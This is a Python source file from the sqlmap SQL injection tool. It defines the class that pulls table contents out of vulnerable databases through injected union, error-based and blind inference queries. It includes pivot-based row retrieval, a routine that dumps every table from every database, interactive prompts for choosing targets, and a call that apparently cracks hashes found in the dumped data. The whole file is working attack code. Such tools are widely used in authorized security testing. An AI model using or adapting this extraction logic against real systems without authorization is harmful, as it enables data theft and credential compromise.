#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from extra.safe2bin.safe2bin import safechardecode
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import clearConsoleLine
from lib.core.common import getLimitRange
from lib.core.common import getUnicode
from lib.core.common import isInferenceAvailable
from lib.core.common import isListLike
from lib.core.common import isNoneValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import prioritySortColumns
from lib.core.common import readInput
from lib.core.common import safeSQLIdentificatorNaming
from lib.core.common import singleTimeWarnMessage
from lib.core.common import unArrayizeValue
from lib.core.common import unsafeSQLIdentificatorNaming
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import DBMS
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import sqlmapConnectionException
from lib.core.exception import sqlmapMissingMandatoryOptionException
from lib.core.exception import sqlmapNoneDataException
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.core.settings import BLANK
from lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD
from lib.core.settings import CURRENT_DB
from lib.core.settings import MAX_INT
from lib.core.settings import NULL
from lib.request import inject
from lib.utils.hash import attackDumpedTable

class Entries:
    """
    This class defines entries' enumeration functionalities for plugins.
    """

    def __init__(self):
        pass

    def __pivotDumpTable(self, table, colList, count=None, blind=True):
        lengths = {}
        entries = {}

        dumpNode = queries[Backend.getIdentifiedDbms()].dump_table.blind

        validColumnList = False
        validPivotValue = False

        if count is None:
            query = dumpNode.count % table
            count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS) if blind else inject.getValue(query, blind=False, expected=EXPECTED.INT)

        if isinstance(count, basestring) and count.isdigit():
            count = int(count)

        if count == 0:
            infoMsg = "table '%s' appears to be empty" % unsafeSQLIdentificatorNaming(table)
            logger.info(infoMsg)

            for column in colList:
                lengths[column] = len(column)
                entries[column] = []

            return entries, lengths

        elif not isNumPosStrValue(count):
            return None

        for column in colList:
            lengths[column] = 0
            entries[column] = BigArray()

        colList = filter(None, sorted(colList, key=lambda x: len(x) if x else MAX_INT))

        for column in colList:
            infoMsg = "fetching number of distinct "
            infoMsg += "values for column '%s'" % column
            logger.info(infoMsg)

            query = dumpNode.count2 % (column, table)
            value = inject.getValue(query, blind=blind, inband=not blind, error=not blind, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if isNumPosStrValue(value):
                validColumnList = True

                if value == count:
                    infoMsg = "using column '%s' as a pivot " % column
                    infoMsg += "for retrieving row data"
                    logger.info(infoMsg)

                    validPivotValue = True

                    colList.remove(column)
                    colList.insert(0, column)
                    break

        if not validColumnList:
            errMsg = "all column name(s) provided are non-existent"
            raise sqlmapNoneDataException, errMsg

        if not validPivotValue:
            warnMsg = "no proper pivot column provided (with unique values)."
            warnMsg += " It won't be possible to retrieve all rows"
            logger.warn(warnMsg)

        pivotValue = " "
        breakRetrieval = False

        try:
            for i in xrange(count):
                if breakRetrieval:
                    break

                for column in colList:
                    # Correction for pivotValues with unrecognized/problematic chars
                    for char in ('\'', '?'):
                        if pivotValue and char in pivotValue and pivotValue[0] != char:
                            pivotValue = pivotValue.split(char)[0]
                            pivotValue = pivotValue[:-1] + chr(ord(pivotValue[-1]) + 1)
                            break
                    if column == colList[0]:
                        query = dumpNode.query % (column, table, column, pivotValue)
                    else:
                        query = dumpNode.query2 % (column, table, colList[0], pivotValue)

                    value = inject.getValue(query, blind=blind, inband=not blind, error=not blind)

                    if column == colList[0]:
                        if isNoneValue(value):
                            breakRetrieval = True
                            break
                        else:
                            pivotValue = safechardecode(value)

                    if conf.limitStart or conf.limitStop:
                        if conf.limitStart and (i + 1) < conf.limitStart:
                            warnMsg = "skipping first %d pivot " % conf.limitStart
                            warnMsg += "point values"
                            singleTimeWarnMessage(warnMsg)
                            break
                        elif conf.limitStop and (i + 1) > conf.limitStop:
                            breakRetrieval = True
                            break

                    value = "" if isNoneValue(value) else unArrayizeValue(value)

                    lengths[column] = max(lengths[column], len(value) if value else 0)
                    entries[column].append(value)

        except KeyboardInterrupt:
            warnMsg = "user aborted during enumeration. sqlmap "
            warnMsg += "will display partial output"
            logger.warn(warnMsg)

        except sqlmapConnectionException, e:
            errMsg = "connection exception detected. sqlmap "
            errMsg += "will display partial output"
            errMsg += "'%s'" % e
            logger.critical(errMsg)

        return entries, lengths

    def dumpTable(self, foundData=None):
        self.forceDbmsEnum()

        if conf.db is None or conf.db == CURRENT_DB:
            if conf.db is None:
                warnMsg = "missing database parameter, sqlmap is going "
                warnMsg += "to use the current database to enumerate "
                warnMsg += "table(s) entries"
                logger.warn(warnMsg)

            conf.db = self.getCurrentDb()

        elif conf.db is not None:
            if Backend.isDbms(DBMS.ORACLE):
                conf.db = conf.db.upper()

            if  ',' in conf.db:
                errMsg = "only one database name is allowed when enumerating "
                errMsg += "the tables' columns"
                raise sqlmapMissingMandatoryOptionException, errMsg

        conf.db = safeSQLIdentificatorNaming(conf.db)

        if conf.tbl:
            if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                conf.tbl = conf.tbl.upper()

            tblList = conf.tbl.split(",")
        else:
            self.getTables()

            if len(kb.data.cachedTables) > 0:
                tblList = kb.data.cachedTables.values()

                if isinstance(tblList[0], (set, tuple, list)):
                    tblList = tblList[0]
            else:
                errMsg = "unable to retrieve the tables "
                errMsg += "in database '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                raise sqlmapNoneDataException, errMsg

        for tbl in tblList:
            tblList[tblList.index(tbl)] = safeSQLIdentificatorNaming(tbl, True)

        for tbl in tblList:
            conf.tbl = tbl
            kb.data.dumpedTable = {}

            if foundData is None:
                kb.data.cachedColumns = {}
                self.getColumns(onlyColNames=True)
            else:
                kb.data.cachedColumns = foundData

            try:
                kb.dumpTable = "%s.%s" % (conf.db, tbl)

                if not safeSQLIdentificatorNaming(conf.db) in kb.data.cachedColumns \
                   or safeSQLIdentificatorNaming(tbl, True) not in \
                   kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)] \
                   or not kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)]:
                    warnMsg = "unable to enumerate the columns for table "
                    warnMsg += "'%s' in database" % unsafeSQLIdentificatorNaming(tbl)
                    warnMsg += " '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                    warnMsg += ", skipping" if len(tblList) > 1 else ""
                    logger.warn(warnMsg)

                    continue

                colList = sorted(filter(None, kb.data.cachedColumns[safeSQLIdentificatorNaming(conf.db)][safeSQLIdentificatorNaming(tbl, True)].keys()))
                colString = ", ".join(column for column in colList)
                rootQuery = queries[Backend.getIdentifiedDbms()].dump_table

                infoMsg = "fetching entries"
                if conf.col:
                    infoMsg += " of column(s) '%s'" % colString
                infoMsg += " for table '%s'" % unsafeSQLIdentificatorNaming(tbl)
                infoMsg += " in database '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                logger.info(infoMsg)

                entriesCount = 0

                if any([isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION), isTechniqueAvailable(PAYLOAD.TECHNIQUE.ERROR), conf.direct]):
                    entries = []
                    query = None

                    if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                        query = rootQuery.inband.query % (colString, tbl.upper() if not conf.db else ("%s.%s" % (conf.db.upper(), tbl.upper())))
                    elif Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD, DBMS.MAXDB):
                        query = rootQuery.inband.query % (colString, tbl)
                    elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL):
                        # Partial inband and error
                        if not (isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and kb.injection.data[PAYLOAD.TECHNIQUE.UNION].where == PAYLOAD.WHERE.ORIGINAL):
                            table = "%s.%s" % (conf.db, tbl)

                            retVal = self.__pivotDumpTable(table, colList, blind=False)

                            if retVal:
                                entries, _ = retVal
                                entries = zip(*[entries[colName] for colName in colList])
                        else:
                            query = rootQuery.inband.query % (colString, conf.db, tbl)
                    elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                        query = rootQuery.inband.query % (colString, conf.db, tbl, prioritySortColumns(colList)[0])
                    else:
                        query = rootQuery.inband.query % (colString, conf.db, tbl)

                    if not entries and query:
                        entries = inject.getValue(query, blind=False, dump=True)

                    if isNoneValue(entries):
                        entries = []
                    elif isinstance(entries, basestring):
                        entries = [entries]
                    elif not isListLike(entries):
                        entries = []

                    entriesCount = len(entries)

                    for index, column in enumerate(colList):
                        colLen = len(column)

                        if column not in kb.data.dumpedTable:
                            kb.data.dumpedTable[column] = {"length": colLen, "values": BigArray()}

                        for entry in entries:
                            if entry is None or len(entry) == 0:
                                continue

                            if isinstance(entry, basestring):
                                colEntry = entry
                            else:
                                colEntry = unArrayizeValue(entry[index]) if index < len(entry) else u''

                            colEntryLen = len({" ": NULL, "": BLANK}.get(getUnicode(colEntry), getUnicode(colEntry)))
                            maxLen = max(colLen, colEntryLen)

                            if maxLen > kb.data.dumpedTable[column]["length"]:
                                kb.data.dumpedTable[column]["length"] = maxLen

                            kb.data.dumpedTable[column]["values"].append(colEntry)

                if not kb.data.dumpedTable and isInferenceAvailable() and not conf.direct:
                    infoMsg = "fetching number of "
                    if conf.col:
                        infoMsg += "column(s) '%s' " % colString
                    infoMsg += "entries for table '%s' " % unsafeSQLIdentificatorNaming(tbl)
                    infoMsg += "in database '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                    logger.info(infoMsg)

                    if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                        query = rootQuery.blind.count % (tbl.upper() if not conf.db else ("%s.%s" % (conf.db.upper(), tbl.upper())))
                    elif Backend.getIdentifiedDbms() in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):
                        query = rootQuery.blind.count % tbl
                    elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL):
                        query = rootQuery.blind.count % ("%s.%s" % (conf.db, tbl))
                    elif Backend.isDbms(DBMS.MAXDB):
                        query = rootQuery.blind.count % tbl
                    else:
                        query = rootQuery.blind.count % (conf.db, tbl)
                    count = inject.getValue(query, inband=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

                    lengths = {}
                    entries = {}

                    if count == 0:
                        warnMsg = "table '%s' " % unsafeSQLIdentificatorNaming(tbl)
                        warnMsg += "in database '%s' " % unsafeSQLIdentificatorNaming(conf.db)
                        warnMsg += "appears to be empty"
                        logger.warn(warnMsg)

                        for column in colList:
                            lengths[column] = len(column)
                            entries[column] = []

                    elif not isNumPosStrValue(count):
                        warnMsg = "unable to retrieve the number of "
                        if conf.col:
                            warnMsg += "column(s) '%s' " % colString
                        warnMsg += "entries for table '%s' " % unsafeSQLIdentificatorNaming(tbl)
                        warnMsg += "in database '%s'" % unsafeSQLIdentificatorNaming(conf.db)
                        logger.warn(warnMsg)

                        continue

                    elif Backend.getIdentifiedDbms() in (DBMS.ACCESS, DBMS.SYBASE, DBMS.MAXDB, DBMS.MSSQL):
                        if Backend.isDbms(DBMS.ACCESS):
                            table = tbl
                        elif Backend.getIdentifiedDbms() in (DBMS.SYBASE, DBMS.MSSQL):
                            table = "%s.%s" % (conf.db, tbl)
                        elif Backend.isDbms(DBMS.MAXDB):
                            table = "%s.%s" % (conf.db, tbl)

                        retVal = self.__pivotDumpTable(table, colList, count, blind=True)

                        if retVal:
                            entries, lengths = retVal

                    else:
                        emptyColumns = []
                        plusOne = Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2)
                        indexRange = getLimitRange(count, dump=True, plusOne=plusOne)

                        if len(colList) < len(indexRange) > CHECK_ZERO_COLUMNS_THRESHOLD:
                            for column in colList:
                                if inject.getValue("SELECT COUNT(%s) FROM %s" % (column, kb.dumpTable), inband=False, error=False) == '0':
                                    emptyColumns.append(column)
                                    debugMsg = "column '%s' of table '%s' will not be " % (column, kb.dumpTable)
                                    debugMsg += "dumped as it appears to be empty"
                                    logger.debug(debugMsg)

                        try:
                            for index in indexRange:
                                for column in colList:
                                    value = ""

                                    if column not in lengths:
                                        lengths[column] = 0

                                    if column not in entries:
                                        entries[column] = BigArray()

                                    if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                                        query = rootQuery.blind.query % (column, conf.db, conf.tbl, sorted(colList, key=len)[0], index)
                                    elif Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
                                        query = rootQuery.blind.query % (column, column,
                                                                        tbl.upper() if not conf.db else ("%s.%s" % (conf.db.upper(), tbl.upper())),
                                                                        index)
                                    elif Backend.isDbms(DBMS.SQLITE):
                                        query = rootQuery.blind.query % (column, tbl, index)

                                    elif Backend.isDbms(DBMS.FIREBIRD):
                                        query = rootQuery.blind.query % (index, column, tbl)

                                    value = NULL if column in emptyColumns else inject.getValue(query, inband=False, error=False, dump=True)

                                    lengths[column] = max(lengths[column], len(value) if value else 0)
                                    entries[column].append(value)

                        except KeyboardInterrupt:
                            clearConsoleLine()
                            warnMsg = "Ctrl+C detected in dumping phase"
                            logger.warn(warnMsg)

                    for column, columnEntries in entries.items():
                        length = max(lengths[column], len(column))

                        kb.data.dumpedTable[column] = {"length": length, "values": columnEntries}

                        entriesCount = len(columnEntries)

                if len(kb.data.dumpedTable) == 0 or (entriesCount == 0 and kb.permissionFlag):
                    warnMsg = "unable to retrieve the entries "
                    if conf.col:
                        warnMsg += "of columns '%s' " % colString
                    warnMsg += "for table '%s' " % unsafeSQLIdentificatorNaming(tbl)
                    warnMsg += "in database '%s'%s" % (unsafeSQLIdentificatorNaming(conf.db), " (permission denied)" if kb.permissionFlag else "")
                    logger.warn(warnMsg)
                else:
                    kb.data.dumpedTable["__infos__"] = {"count": entriesCount,
                                                        "table": safeSQLIdentificatorNaming(tbl, True),
                                                        "db": safeSQLIdentificatorNaming(conf.db)}
                    attackDumpedTable()
                    conf.dumper.dbTableValues(kb.data.dumpedTable)

            except sqlmapConnectionException, e:
                errMsg = "connection exception detected in dumping phase: "
                errMsg += "'%s'" % e
                logger.critical(errMsg)

            finally:
                kb.dumpTable = None

    def dumpAll(self):
        if conf.db is not None and conf.tbl is None:
            self.dumpTable()
            return

        if Backend.isDbms(DBMS.MYSQL) and not kb.data.has_information_schema:
            errMsg = "information_schema not available, "
            errMsg += "back-end DBMS is MySQL < 5.0"
            raise sqlmapUnsupportedFeatureException, errMsg

        infoMsg = "sqlmap will dump entries of all tables from all databases now"
        logger.info(infoMsg)

        conf.tbl = None
        conf.col = None

        self.getTables()

        if kb.data.cachedTables:
            if isinstance(kb.data.cachedTables, list):
                kb.data.cachedTables = { None: kb.data.cachedTables }

            for db, tables in kb.data.cachedTables.items():
                conf.db = db

                for table in tables:
                    try:
                        conf.tbl = table
                        kb.data.cachedColumns = {}
                        kb.data.dumpedTable = {}

                        self.dumpTable()
                    except sqlmapNoneDataException:
                        infoMsg = "skipping table '%s'" % table
                        logger.info(infoMsg)

    def dumpFoundColumn(self, dbs, foundCols, colConsider):
        message = "do you want to dump entries? [Y/n] "
        output = readInput(message, default="Y")

        if output and output[0] not in ("y", "Y"):
            return

        dumpFromDbs = []
        message = "which database(s)?\n[a]ll (default)\n"

        for db, tblData in dbs.items():
            if tblData:
                message += "[%s]\n" % db

        message += "[q]uit"
        test = readInput(message, default="a")

        if not test or test in ("a", "A"):
            dumpFromDbs = dbs.keys()
        elif test in ("q", "Q"):
            return
        else:
            dumpFromDbs = test.replace(" ", "").split(",")

        for db, tblData in dbs.items():
            if db not in dumpFromDbs or not tblData:
                continue

            conf.db = db
            dumpFromTbls = []
            message = "which table(s) of database '%s'?\n" % db
            message += "[a]ll (default)\n"

            for tbl in tblData:
                message += "[%s]\n" % tbl

            message += "[s]kip\n"
            message += "[q]uit"
            test = readInput(message, default="a")

            if not test or test in ("a", "A"):
                dumpFromTbls = tblData
            elif test in ("s", "S"):
                continue
            elif test in ("q", "Q"):
                return
            else:
                dumpFromTbls = test.replace(" ", "").split(",")

            for table, columns in tblData.items():
                if table not in dumpFromTbls:
                    continue

                conf.tbl = table
                conf.col = ",".join(column for column in filter(None, sorted(columns)))
                kb.data.cachedColumns = {}
                kb.data.dumpedTable = {}

                data = self.dumpTable(dbs)

                if data:
                    conf.dumper.dbTableValues(data)

    def dumpFoundTables(self, tables):
        message = "do you want to dump tables' entries? [Y/n] "
        output = readInput(message, default="Y")

        if output and output[0].lower() != "y":
            return

        dumpFromDbs = []
        message = "which database(s)?\n[a]ll (default)\n"

        for db, tablesList in tables.items():
            if tablesList:
                message += "[%s]\n" % db

        message += "[q]uit"
        test = readInput(message, default="a")

        if not test or test.lower() == "a":
            dumpFromDbs = tables.keys()
        elif test.lower() == "q":
            return
        else:
            dumpFromDbs = test.replace(" ", "").split(",")

        for db, tablesList in tables.items():
            if db not in dumpFromDbs or not tablesList:
                continue

            conf.db = db
            dumpFromTbls = []
            message = "which table(s) of database '%s'?\n" % db
            message += "[a]ll (default)\n"

            for tbl in tablesList:
                message += "[%s]\n" % tbl

            message += "[s]kip\n"
            message += "[q]uit"
            test = readInput(message, default="a")

            if not test or test.lower() == "a":
                dumpFromTbls = tablesList
            elif test.lower() == "s":
                continue
            elif test.lower() == "q":
                return
            else:
                dumpFromTbls = test.replace(" ", "").split(",")

            for table in dumpFromTbls:
                conf.tbl = table
                kb.data.cachedColumns = {}
                kb.data.dumpedTable = {}

                data = self.dumpTable()

                if data:
                    conf.dumper.dbTableValues(data)
